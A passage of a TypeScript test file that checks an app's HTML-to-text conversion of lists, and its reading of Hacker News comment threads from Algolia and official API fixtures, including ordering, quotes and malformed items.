      { kind: "paragraph", spans: [{ text: "3. three" }] },
      { kind: "paragraph", spans: [{ text: "4. four\nlines" }] },
      { kind: "paragraph", spans: [{ text: "• in it" }] },
    ]);
  });

  test("a long list is read in a moment, each item counted once", async () => {
    const html = `<ol>${"<li>an item</li>".repeat(20_000)}</ol>`;
    const read = await app.page.evaluate((html) => {
      const start = performance.now();
      const blocks = window.testing.discussions.htmlToText(html);
      return { ms: performance.now() - start, count: blocks.length, last: blocks.at(-1)!.spans[0].text };
    }, html);
    expect([read.count, read.last]).toEqual([20_000, "20000. an item"]);
    expect(read.ms).toBeLessThan(2000);
  });

  const story = () => JSON.parse(fixture("hn-story.json"));
  const read = (item: unknown, official?: unknown) => app.page.evaluate(([item, official]) => window.testing.discussions.readThread(item, official), [item, official] as const);

  test("Hacker News: a story's thread from Algolia, its first comments in the order Hacker News ranks them, with its count", async () => {
    const thread = await read(story(), JSON.parse(fixture("hn-official.json")));
    expect([thread.author, thread.count]).toEqual(["inatreecrown2", 17]);
    // Algolia's are oldest first; Hacker News ranks the oldest last.
    expect(thread.comments.map((comment) => comment.author)).toEqual(["yjftsjthsd-h", "inatreecrown2", "sscarduzio", "microtonal"]);
    const [first] = thread.comments;
    expect([first.id, new Date(first.time!).toISOString(), first.replies.map((reply) => reply.author)]).toEqual(["50479019", "2026-11-13T06:07:47.000Z", ["inatreecrown2", "dead_hn_theory"]]);
    // A paragraph starting with ">" is a quote, as Hacker News means it.
    expect(first.replies[1].text).toEqual([
      { kind: "quote", spans: [{ text: "treating this as a blast from the past." }] },
      { kind: "paragraph", spans: [{ text: "Well, for most of us it is." }] },
    ]);
    // Without the official API's answer, or with one that isn't a story's, Algolia's order, and no count.
    for (const official of [null, { kids: "no", descendants: "17" }]) {
      const unranked = await read(story(), official);
      expect([unranked.count, unranked.comments[0].author]).toEqual([undefined, "microtonal"]);
    }
  });

  test("Hacker News: what isn't a comment is left out, what a comment lacks is left unsaid, and only a story's thread is read", async () => {
    const odd = {
      id: 1,
      type: "story",
      author: "op",
      children: [
        { id: 2, type: "comment", author: "no-time", text: "Fine.", children: [null, "text", { id: 3, type: "pollopt", text: "Option" }] },
        { id: 4, type: "comment", author: null, created_at_i: "soon", text: null },
        { type: "comment", author: "no-id", created_at_i: 1, text: "Lost." },
        42,
      ],
    };
    expect(await read(odd)).toEqual({
      author: "op",
      comments: [
        { id: "2", author: "no-time", text: [{ kind: "paragraph", spans: [{ text: "Fine." }] }], replies: [] },
        { id: "4", author: "", text: [], replies: [] },
      ],
    });
    // A comment's link (its author isn't who posted the story), or anything else, isn't read as a story's.
    const error = (item: unknown) => app.page.evaluate((item) => {
      try {
        window.testing.discussions.readThread(item);
        return null;
      } catch (error) {
        return (error as Error).message;
      }
    }, item);
    expect(await error({ id: 2, type: "comment", author: "someone", children: [] })).toBe("Not a story's comments");
    expect(await error("<html>")).toBe("Not a story's comments");
  });
});
